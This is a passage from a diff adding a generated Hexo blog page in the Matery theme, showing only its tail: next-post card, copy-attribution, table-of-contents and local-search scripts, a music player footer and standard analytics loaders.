+                            <i class="fas fa-user fa-fw"></i>
+                            fantasycat6
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="../../di-4-zhang-heng-xiang-yi-dong/di-4-zhang-heng-xiang-yi-dong/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../../../../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            fantasycat6
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Hexo<br />'
+            + '文章作者: fantasycat6<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="../../../../../../../../libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="../../../../../../../../libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="../../../../../../../../libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="../../../../../../../../libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="../../../../../../../../libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="../../../../../../../../libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="7788095093"
+                   fixed='true'
+                   autoplay='true'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="../../../../../../../../libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2023</span>
+            
+            <span id="year">2022</span>
+            <a href="../../../../../../../../about" target="_blank">fantasycat6</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">312.9k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/fantasycat6" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1745272762@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1745272762" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1745272762" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="../../../../../../../../atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('../../../../../../../../search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="../../../../../../../../libs/materialize/materialize.min.js"></script>
+    <script src="../../../../../../../../libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="../../../../../../../../libs/aos/aos.js"></script>
+    <script src="../../../../../../../../libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="../../../../../../../../libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="../../../../../../../../js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="../../../../../../../../libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="../../../../../../../../libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="../../../../../../../../libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
